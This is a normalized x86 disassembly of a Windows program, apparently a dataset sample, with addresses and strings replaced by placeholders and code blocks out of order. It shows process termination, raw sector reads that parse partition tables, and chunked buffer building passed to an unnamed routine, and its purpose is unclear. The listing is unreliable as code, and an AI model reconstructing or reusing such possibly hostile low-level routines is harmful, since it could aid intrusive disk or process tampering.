call strlen
add esi eax
pop ecx
cmp [ esi ] bl
lea eax [ esi + 0x1 ]
je r-xdata
push esi
call strlen
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
call sub_40c89c
push [ ebp - 0x1c ]
mov esi eax
push esi
call sub_40267e
push 0x6
push rw-data
push esi
call strncmp
add esp 0x20
test eax eax
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x117c ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x117c ]
push eax
call _strdup
mov esi [ CloseHandle@IAT ]
add esp 0x10
mov edi eax
push [ ebp - 0x2c ]
call esi
push [ ebp - 0x30 ]
call esi
push [ ebp - 0xc ]
call esi
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x28 ]
push ebx
push 0x1
call [ OpenProcess@IAT ]
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov [ eax ] bl
cmp [ ebp - 0x4 ] ebx
je r-xdata
push ebx
push eax
call [ TerminateProcess@IAT ]
push edi
call strlen
pop ecx
mov [ rw-data ] eax
jmp r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
mov eax edi
sub_408bda
push ebp
mov ebp esp
sub esp 0x20c
push ebx
xor ebx ebx
push esi
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
lea ecx [ ebp - 0x4 ]
push ebx
push ecx
push eax
push [ rw-data ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
call [ SetFilePointer@IAT ]
lea eax [ ebp - 0xc ]
push ebx
push eax
mov esi 0x200
lea eax [ ebp - 0x20c ]
push esi
push eax
push [ rw-data ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0x4
lea eax [ ebp - 0x209 ]
push rw-data
push eax
call memcmp
add esp 0xc
test eax eax
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
movzx eax [ ebp - 0x201 ]
movzx ecx [ ebp - 0x1ff ]
imul eax ecx
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0xf
pop eax
jmp r-xdata
pop esi
pop ebx
leave
retn
mov cl [ ebp - 0x1cc ]
push 0x1
neg ecx
pop eax
shl eax cl
cmp eax esi
mov [ rw-data ] eax
jb r-xdata
push eax
call ??3@YAXPAX@Z
pop ecx
mov eax 0x400
mov [ rw-data ] eax
cmp eax 0x800
jbe r-xdata
xor eax eax
mov [ rw-data ] bl
jmp r-xdata
push eax
call ??2@YAPAXI@Z
push [ ebp - 0x1d8 ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
push [ ebp - 0x1dc ]
call sub_408ce6
add esp 0xc
cmp eax ebx
je r-xdata
sub_408ce6
push ebp
mov ebp esp
sub esp 0x4c0
push ebx
xor ebx ebx
cmp [ rw-data ] bl
jne r-xdata
push esi
push edi
lea ecx [ ebp - 0x4c0 ]
call sub_40b7e4
push 0xa
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call mbstowcs
add esp 0xc
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
push [ ebp + 0xc ]
mov esi eax
mov edi edx
push [ ebp + 0x8 ]
push ebx
push [ rw-data ]
call sub_4190a0
add esi eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
push esi
mov [ ebp - 0xc ] esi
push [ rw-data ]
adc edi edx
mov [ ebp - 0x8 ] edi
call [ SetFilePointer@IAT ]
pop edi
cmp eax 0xffffffff
pop esi
jne r-xdata
push 0xc
pop eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
pop ebx
leave
retn
push [ rw-data ]
lea ecx [ ebp - 0x4c0 ]
call sub_40b87f
push [ rw-data ]
push [ rw-data ]
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
push edx
push eax
lea ecx [ ebp - 0x4c0 ]
call sub_40b889
push ebx
lea ecx [ ebp - 0x4c0 ]
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_40b8c0
cmp eax ebx
je r-xdata
mov ebx eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push 0x8
push eax
lea eax [ ebp - 0x42e ]
push eax
call memcmp
add esp 0xc
test eax eax
je r-xdata
lea ecx [ ebp - 0x4c0 ]
call sub_40b851
mov eax ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ebx 0x4b0
jmp r-xdata
push [ ebp - 0x28 ]
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call ??2@YAPAXI@Z
mov ecx [ ebp - 0x28 ]
mov [ rw-data ] eax
push ecx
mov [ rw-data ] ecx
push [ ebp - 0x2c ]
push eax
call memcpy
add esp 0x10
push eax
call ??3@YAXPAX@Z
pop ecx
sub_408e60
push ebp
mov ebp esp
sub esp 0x4a0
push ebx
xor ebx ebx
cmp [ rw-data ] bl
jne r-xdata
lea ecx [ ebp - 0x4a0 ]
call sub_40b7e4
mov eax [ rw-data ]
push eax
imul eax [ ebp + 0x8 ]
add eax [ rw-data ]
push eax
push [ rw-data ]
call memcpy
add esp 0xc
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
call sub_40b87f
push [ rw-data ]
push [ rw-data ]
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
push edx
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40b889
push ebx
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
push [ rw-data ]
call sub_40b8c0
cmp eax ebx
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
call ??2@YAPAXI@Z
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
push eax
mov [ edx ] eax
push [ ebp - 0xc ]
push [ ecx ]
call memcpy
add esp 0x10
mov ebx eax
jmp r-xdata
pop ebx
leave
retn
lea ecx [ ebp - 0x4a0 ]
call sub_40b851
mov eax ebx
sub_408f36
push ebp
mov ebp esp
sub esp 0x4a0
push ebx
xor ebx ebx
cmp [ rw-data ] bl
push esi
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
imul eax [ rw-data ]
cmp eax [ rw-data ]
jb r-xdata
push 0xc
jmp r-xdata
lea ecx [ ebp - 0x4a0 ]
call sub_40b7e4
mov eax [ rw-data ]
push eax
imul eax esi
add eax [ rw-data ]
push eax
push [ rw-data ]
call memcpy
add esp 0xc
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
call sub_40b87f
push [ rw-data ]
push [ rw-data ]
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
push edx
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40b889
push 0x1
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
push [ rw-data ]
call sub_40b8c0
cmp eax ebx
je r-xdata
push 0x12
pop eax
jmp r-xdata
mov esi [ ebp + 0xc ]
push 0x140
push ebx
push esi
call memset
lea eax [ ebp - 0x40e ]
push eax
call wcslen
add esp 0x10
test eax eax
ja r-xdata
mov ebx eax
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp [ rw-data ] 0x1
push ebx
push ebx
push 0x104
lea eax [ ebp - 0x40e ]
push esi
push eax
jne r-xdata
push rw-data
jmp r-xdata
lea ecx [ ebp - 0x4a0 ]
call sub_40b851
mov eax ebx
call wcslen
pop ecx
push eax
lea eax [ ebp - 0x40e ]
push eax
push ebx
push 0xfde9
call wcslen
pop ecx
push eax
lea eax [ ebp - 0x40e ]
push eax
push ebx
push 0x3
jmp r-xdata
push esi
call sprintf
pop ecx
pop ecx
mov eax [ ebp - 0x418 ]
mov ecx [ ebp - 0x424 ]
mov [ esi + 0x128 ] eax
mov eax [ ebp - 0x478 ]
mov [ esi + 0x108 ] eax
mov eax [ ebp - 0x474 ]
mov [ esi + 0x10c ] eax
mov eax [ ebp - 0x470 ]
mov [ esi + 0x110 ] eax
mov eax [ ebp - 0x46c ]
mov [ esi + 0x114 ] eax
mov eax [ ebp - 0x460 ]
mov [ esi + 0x120 ] eax
mov eax [ ebp - 0x45c ]
mov [ esi + 0x124 ] eax
mov eax [ ebp - 0x468 ]
mov [ esi + 0x118 ] eax
mov eax [ ebp - 0x464 ]
mov [ esi + 0x11c ] eax
mov eax [ ebp - 0x428 ]
mov edx eax
mov [ esi + 0x130 ] eax
or edx ecx
mov [ esi + 0x134 ] ecx
jne r-xdata
push rw-data
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
mov [ esi + 0x130 ] eax
mov [ esi + 0x134 ] ecx
sete al
mov [ esi + 0x138 ] al
push 0x1
xor ecx ecx
pop eax
sub_40912d
push ebp
mov ebp esp
sub esp 0x4a0
push ebx
xor ebx ebx
cmp [ rw-data ] bl
push esi
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
imul eax [ rw-data ]
cmp eax [ rw-data ]
jb r-xdata
push 0xc
jmp r-xdata
lea ecx [ ebp - 0x4a0 ]
call sub_40b7e4
mov eax [ rw-data ]
push eax
imul eax esi
add eax [ rw-data ]
push eax
push [ rw-data ]
call memcpy
add esp 0xc
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
call sub_40b87f
push [ rw-data ]
push [ rw-data ]
push ebx
push [ rw-data ]
push ebx
push [ rw-data ]
call sub_4190a0
push edx
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40b889
push 0x1
lea ecx [ ebp - 0x4a0 ]
push [ rw-data ]
push [ rw-data ]
call sub_40b8c0
cmp eax ebx
je r-xdata
push 0x12
pop eax
jmp r-xdata
mov esi [ ebp + 0xc ]
push 0x140
push ebx
push esi
call memset
lea eax [ ebp - 0x40e ]
push eax
call wcslen
add esp 0x10
test eax eax
ja r-xdata
mov ebx eax
jmp r-xdata
pop esi
pop ebx
leave
retn
push ebx
push ebx
push 0x104
lea eax [ ebp - 0x40e ]
push esi
push eax
call wcslen
pop ecx
push eax
lea eax [ ebp - 0x40e ]
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
lea ecx [ ebp - 0x4a0 ]
call sub_40b851
mov eax ebx
mov eax [ ebp - 0x418 ]
mov ecx [ ebp - 0x424 ]
mov [ esi + 0x128 ] eax
mov eax [ ebp - 0x478 ]
mov [ esi + 0x108 ] eax
mov eax [ ebp - 0x474 ]
mov [ esi + 0x10c ] eax
mov eax [ ebp - 0x470 ]
mov [ esi + 0x110 ] eax
mov eax [ ebp - 0x46c ]
mov [ esi + 0x114 ] eax
mov eax [ ebp - 0x460 ]
mov [ esi + 0x120 ] eax
mov eax [ ebp - 0x45c ]
mov [ esi + 0x124 ] eax
mov eax [ ebp - 0x468 ]
mov [ esi + 0x118 ] eax
mov eax [ ebp - 0x464 ]
mov [ esi + 0x11c ] eax
mov eax [ ebp - 0x428 ]
mov edx eax
mov [ esi + 0x130 ] eax
or edx ecx
mov [ esi + 0x134 ] ecx
jne r-xdata
push rw-data
push esi
call sprintf
pop ecx
pop ecx
cmp [ ebp - 0x4 ] bl
mov [ esi + 0x130 ] eax
mov [ esi + 0x134 ] ecx
sete al
mov [ esi + 0x138 ] al
push 0x1
xor ecx ecx
pop eax
sub_409330
push ebp
mov ebp esp
sub esp 0x5c0
push ebx
mov ebx [ wsprintfA@IAT ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20 ] edi
mov [ rw-data ] edi
mov [ ebp - 0x8 ] edi
push rw-data
lea ecx [ ebp - 0x2c ]
push edi
push ecx
mov esi 0x200
lea ecx [ ebp - 0x3c0 ]
push esi
push ecx
push eax
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0xa0 ]
push eax
push [ ebp + 0x8 ]
call strcat
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc0 ]
push rw-data
push rw-data
push eax
call sprintf
add esp 0x24
lea eax [ ebp - 0xc0 ]
push edi
push edi
push 0x3
push edi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x38 ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
lea eax [ ebp - 0x1fe ]
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1fa ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1f6 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1ff ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x200 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x201 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] eax
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x1c0 ]
push rw-data
push eax
call ebx
push [ ebp + 0x8 ]
call strlen
mov esi eax
lea eax [ ebp - 0x1c0 ]
push eax
call strlen
lea eax [ esi + eax + 0x2 ]
add esp 0x14
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp [ ebp - 0x20 ] edi
setle al
dec eax
and ax 0xf200
add eax 0xe00
mov eax 0xe02
jmp r-xdata
mov [ ebp - 0x48 ] 0x2
cmp cl 0xf
mov [ ebp - 0x48 ] 0x1
jne r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xa
jl r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
cmp cl 0xf
je r-xdata
cmp cl 0x5
je r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
test cl cl
je r-xdata
mov [ ebp - 0x30 ] edi
mov eax [ ebp - 0xc ]
mov eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x28 ] edi
jne r-xdata
movzx eax cl
cmp eax 0x7
jg r-xdata
inc [ ebp - 0x30 ]
cmp [ ebp - 0x30 ] 0x1b
jl r-xdata
push edi
push esi
push edi
push eax
call sub_4190a0
lea ecx [ ebp - 0x5c ]
push edi
push ecx
push eax
push [ ebp - 0x38 ]
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] edx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x48 ] 0x2
mov [ ebp - 0x40 ] eax
jne r-xdata
push [ ebp - 0x38 ]
call [ CloseHandle@IAT ]
push rw-data
jmp r-xdata
lea eax [ ebp - 0x1c0 ]
push rw-data
push eax
call ebx
push [ ebp + 0x8 ]
call strlen
mov esi eax
lea eax [ ebp - 0x1c0 ]
push eax
call strlen
lea eax [ esi + eax + 0x2 ]
add esp 0x10
cmp eax [ ebp + 0xc ]
jae r-xdata
cmp eax 0xb
jl r-xdata
je r-xdata
cmp [ ebp - 0x48 ] 0x2
jne r-xdata
push 0x10
pop eax
add [ ebp - 0x24 ] eax
add [ ebp - 0x10 ] eax
add [ ebp - 0x1c ] eax
add [ ebp - 0x14 ] eax
add [ ebp - 0xc ] eax
add [ ebp - 0x18 ] eax
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push edi
push eax
lea eax [ ebp - 0x5c0 ]
push esi
push eax
push [ ebp - 0x38 ]
mov [ ebp - 0x2c ] edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push eax
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call sprintf
add esp 0xc
cmp eax 0xc
jle r-xdata
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call strcpy
inc [ ebp - 0x20 ]
pop ecx
pop ecx
jmp r-xdata
mov ecx eax
dec ecx
je r-xdata
inc [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x4
jl r-xdata
cmp [ ebp - 0x2c ] esi
jne r-xdata
lea ecx [ ebp - 0xa0 ]
push ecx
push eax
push rw-data
mov ecx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov ecx [ rw-data ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0xa0 ]
push ecx
push eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
cmp eax 0xe
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
push rw-data
jmp r-xdata
sub ecx 0x3
je r-xdata
mov eax [ ebp - 0x24 ]
movzx ax [ eax ]
mov [ ebp - 0x52 ] ax
mov eax [ ebp - 0x10 ]
movzx ax [ eax ]
mov [ ebp - 0x50 ] ax
mov eax [ ebp - 0x1c ]
movzx ax [ eax ]
mov [ ebp - 0x54 ] ax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x18 ]
mov cl [ eax ]
cmp cl 0x5
je r-xdata
jmp r-xdata
push 0x1e
pop eax
jmp r-xdata
lea esi [ ebp - 0x3fe ]
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x1c0 ]
push eax
call sub_409308
pop ecx
pop ecx
push 0x10
pop eax
add [ ebp - 0x24 ] eax
add [ ebp - 0x10 ] eax
add [ ebp - 0x1c ] eax
add [ ebp - 0x14 ] eax
add [ ebp - 0xc ] eax
add [ ebp - 0x18 ] eax
inc [ ebp - 0x4 ]
xor edi edi
lea eax [ ebp - 0x1c0 ]
push eax
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
lea eax [ ebp - 0x1c0 ]
push eax
call ebx
add esp 0x10
push [ ebp + 0x8 ]
call strlen
mov edi eax
lea eax [ ebp - 0x1c0 ]
push eax
call strlen
lea eax [ edi + eax + 0x2 ]
pop ecx
cmp eax [ ebp + 0xc ]
pop ecx
jae r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call strcpy
pop ecx
pop ecx
jmp r-xdata
push rw-data
jmp r-xdata
cmp eax 0x42
jne r-xdata
dec ecx
dec ecx
je r-xdata
movzx ax [ esi - 0x1 ]
mov [ ebp - 0x54 ] ax
mov cl [ esi ]
movzx ax [ esi - 0x3 ]
and [ ebp - 0x44 ] 0x0
mov [ ebp - 0x52 ] ax
mov eax [ esi + 0x8 ]
cmp cl 0x5
mov [ ebp - 0x4c ] eax
movzx ax [ esi - 0x2 ]
mov [ ebp - 0x50 ] ax
je r-xdata
push rw-data
mov [ ebp - 0x48 ] 0x2
cmp cl 0xf
mov [ ebp - 0x48 ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x58 ] eax
add eax edx
cmp cl 0xf
je r-xdata
cmp cl 0x5
je r-xdata
mov esi 0x200
xor edi edi
test cl cl
je r-xdata
mov eax [ esi + 0x4 ]
add eax [ ebp - 0x58 ]
add eax [ ebp - 0x34 ]
jmp r-xdata
cmp cl 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x2
mov [ ebp - 0x40 ] eax
je r-xdata
push rw-data
cmp cl 0x4
je r-xdata
lea ecx [ ebp - 0xa0 ]
push ecx
push eax
push rw-data
mov ecx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov ecx [ rw-data ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0xa0 ]
push ecx
push eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
cmp cl 0x6
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x1c0 ]
push eax
call sub_409308
add esi 0x10
inc [ ebp - 0x4 ]
inc edi
pop ecx
cmp edi 0x4
pop ecx
jl r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
lea eax [ ebp - 0x1c0 ]
push eax
call ebx
add esp 0x10
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x1c0 ]
push eax
call strlen
lea eax [ ebx + eax + 0x2 ]
pop ecx
cmp eax [ ebp + 0xc ]
pop ecx
jae r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call strcpy
pop ecx
pop ecx
cmp cl 0x7
je r-xdata
mov ebx [ wsprintfA@IAT ]
mov eax [ ebp - 0x40 ]
mov ebx [ wsprintfA@IAT ]
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call strcpy
inc [ ebp - 0x20 ]
pop ecx
pop ecx
jmp r-xdata
cmp cl 0xa
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
push rw-data
jmp r-xdata
cmp cl 0xc
jbe r-xdata
push rw-data
jmp r-xdata
cmp cl 0xe
je r-xdata
sub_4098c6
push ebp
mov ebp esp
sub esp 0x504
push esi
push edi
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0x18 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x9
mov esi rw-data
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xa
mov esi rw-data
pop ecx
lea edi [ ebp - 0x84 ]
[ edi ] [ esi ]
push [ ebp + 0x8 ]
and [ ebp - 0x504 ] 0x0
movsb [ edi ] [ esi ]
call atoi
test eax eax
pop ecx
je r-xdata
push [ rw-data ]
mov esi 0x400
lea eax [ ebp - 0x504 ]
push esi
push eax
call sub_409330
add esp 0xc
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov [ rw-data ] eax
cmp eax 0xe00
jne r-xdata
lea eax [ ebp - 0x504 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x30 ]
push eax
call strlen
lea eax [ edi + eax + 0x1 ]
pop ecx
cmp eax esi
pop ecx
jae r-xdata
cmp eax 0xe02
jne r-xdata
lea eax [ ebp - 0x504 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x18 ]
push eax
call strlen
lea eax [ edi + eax + 0x1 ]
pop ecx
cmp eax esi
pop ecx
jae r-xdata
lea eax [ ebp - 0x504 ]
push eax
call _strdup
pop ecx
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x30 ]
cmp eax 0x1e
jne r-xdata
lea eax [ ebp - 0x504 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x84 ]
push eax
call strlen
lea eax [ edi + eax + 0x1 ]
pop ecx
cmp eax esi
pop ecx
jae r-xdata
lea eax [ ebp - 0x18 ]
jmp r-xdata
push ebx
push eax
mov edi rw-data
lea eax [ ebp - 0x104 ]
push edi
push eax
call sprintf
lea eax [ ebp - 0x104 ]
push eax
call strlen
mov ebx eax
lea eax [ ebp - 0x504 ]
push eax
call strlen
add esp 0x14
lea eax [ ebx + eax + 0x1 ]
cmp eax esi
pop ebx
jae r-xdata
lea eax [ ebp - 0x504 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
call strlen
lea eax [ edi + eax + 0x1 ]
pop ecx
cmp eax esi
pop ecx
jae r-xdata
lea eax [ ebp - 0x84 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x504 ]
push eax
call strcat
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x504 ]
push edi
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x104 ]
jmp r-xdata
lea eax [ ebp - 0x58 ]
jmp r-xdata
sub_409a84
push ebp
mov ebp esp
mov eax 0x11c0
call sub_418fe0
xor eax eax
push ebx
cmp [ ebp + 0x8 ] eax
push esi
push edi
mov [ ebp - 0x10 ] eax
je r-xdata
lea eax [ ebp - 0x11c0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x11c0 ]
push eax
call _strdup
add esp 0xc
cmp [ ebp + 0xc ] eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x10 ]
shl ecx 0xa
cmp eax ecx
mov [ ebp - 0x18 ] eax
mov edi rw-data
mov esi rw-data
jbe r-xdata
lea eax [ ebp - 0x34 ]
push 0xa
push eax
push [ ebp - 0x10 ]
call _itoa
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
mov ecx [ ebp - 0x18 ]
add ecx ebx
lea ebx [ eax + ecx + 0xa ]
push ebx
mov [ ebp - 0x8 ] ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0xc ] eax
call memset
add esp 0x24
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
push rw-data
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
pop ecx
lea eax [ ebx + eax + 0x9 ]
pop ecx
push eax
push [ ebp - 0xc ]
call _snprintf
add esp 0x14
push [ ebp - 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
pop ecx
mov edx ebx
mov ebx [ ebp - 0xc ]
pop ecx
mov ecx ebx
add ecx edx
lea eax [ eax + ecx + 0x9 ]
push eax
call memcpy
mov eax [ ebp - 0x8 ]
push eax
push ebx
and [ eax + ebx - 0x1 ] 0x0
mov [ rw-data ] eax
call sub_40267e
push [ rw-data ]
push ebx
call sub_40c768
add esp 0x1c
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
lea eax [ ebp - 0x34 ]
push 0xa
push eax
push [ ebp - 0x10 ]
call _itoa
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
add ebx eax
mov eax [ rw-data ]
shl eax 0xa
lea ebx [ ebx + eax + 0xa ]
push ebx
mov [ ebp - 0x8 ] ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0xc ] eax
call memset
add esp 0x24
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
push rw-data
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
pop ecx
lea eax [ ebx + eax + 0x9 ]
pop ecx
push eax
push [ ebp - 0xc ]
call _snprintf
mov eax [ rw-data ]
add esp 0x14
shl eax 0xa
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call strlen
mov ebx eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
pop ecx
mov edx ebx
mov ebx [ ebp - 0xc ]
pop ecx
mov ecx ebx
add ecx edx
lea eax [ eax + ecx + 0x9 ]
push eax
call memcpy
mov eax [ ebp - 0x8 ]
push eax
push ebx
and [ eax + ebx - 0x1 ] 0x0
mov [ rw-data ] eax
call sub_40267e
push [ rw-data ]
push ebx
call sub_40c768
add esp 0x1c
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push [ rw-data ]
call strlen
push [ ebp - 0x4 ]
mov ebx eax
call strlen
push edi
add ebx eax
call strlen
push esi
add ebx eax
call strlen
lea ebx [ ebx + eax + 0x6 ]
push ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0x8 ] eax
call memset
push [ ebp - 0x4 ]
push edi
mov edi [ ebp - 0x8 ]
push esi
push [ rw-data ]
push rw-data
push ebx
push edi
call _snprintf
xor ebx ebx
add esp 0x3c
cmp [ ebp - 0x4 ] ebx
je r-xdata
push ebx
call free
pop ecx
push [ rw-data ]
call strlen
push [ ebp - 0x4 ]
mov ebx eax
call strlen
push edi
add ebx eax
call strlen
push esi
add ebx eax
call strlen
lea ebx [ ebx + eax + 0x6 ]
push ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0x8 ] eax
call memset
push [ ebp - 0x4 ]
push edi
push esi
push [ rw-data ]
push rw-data
push ebx
push [ ebp - 0x8 ]
call _snprintf
add esp 0x3c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push ebx
call free
pop ecx
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push edi
push rw-data
call sub_402b19
mov esi eax
add esp 0x14
test esi esi
mov [ ebp - 0x4 ] esi
je r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
and [ ebp - 0xc ] 0x0
push [ ebp - 0x4 ]
call free
pop ecx
inc ebx
cmp ebx 0x14
jl r-xdata
push 0x2
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x14
jl r-xdata
push 0x2
push rw-data
push ebx
call strncmp
add esp 0xc
test eax eax
je r-xdata
test edi edi
je r-xdata
push 0x2
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x8 ]
push rw-data
call sub_402b19
mov ebx eax
add esp 0x14
test ebx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x2
push rw-data
push ebx
call strncmp
add esp 0xc
test eax eax
je r-xdata
cmp ebx 0x14
jl r-xdata
push edi
call free
pop ecx
push esi
call free
pop ecx
